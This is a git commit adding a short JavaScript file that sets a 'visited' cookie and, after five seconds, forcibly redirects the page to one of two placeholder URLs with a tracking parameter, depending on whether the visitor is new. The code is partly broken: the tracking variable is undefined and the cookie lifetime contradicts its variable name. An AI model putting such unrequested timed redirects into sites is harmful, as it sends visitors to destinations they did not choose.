36c5c7dbe439f1e2c6929467c17f8e4140fac026
fortunatos <30715191+fortunatos@users.noreply.github.com>
2022-04-29 02:04:56 -0300

    Add files via upload

---
+++ scriptrdn.js
@@ -0,0 +1,38 @@
+function cScript()
+{
+	
+function AbreLink1()     
+{
+  
+window.location.href = "https://primeiroclick.kk?source="+rastreio2;
+  
+}
+  
+function AbreLink2()      
+{
+  
+window.location.href = "https://segundoclick.kk?source="+rastreio2; 
+  
+} 
+
+var language = navigator.language || navigator.userLanguage; 
+language = language.substring( 0, 2 );
+  
+jQuery(document).ready(function(){
+if (document.cookie.indexOf('visited=true') == -1) {
+var fifteenDays = 1000*60*60*36;
+var expires = new Date((new Date()).valueOf() + fifteenDays);
+document.cookie = "visited=true;expires=" + expires.toUTCString();
+  
+setTimeout('AbreLink1()', 5000);  
+  
+}else{  
+
+setTimeout('AbreLink2()', 5000);
+  
+}
+});
+	
+	
+}  
+   
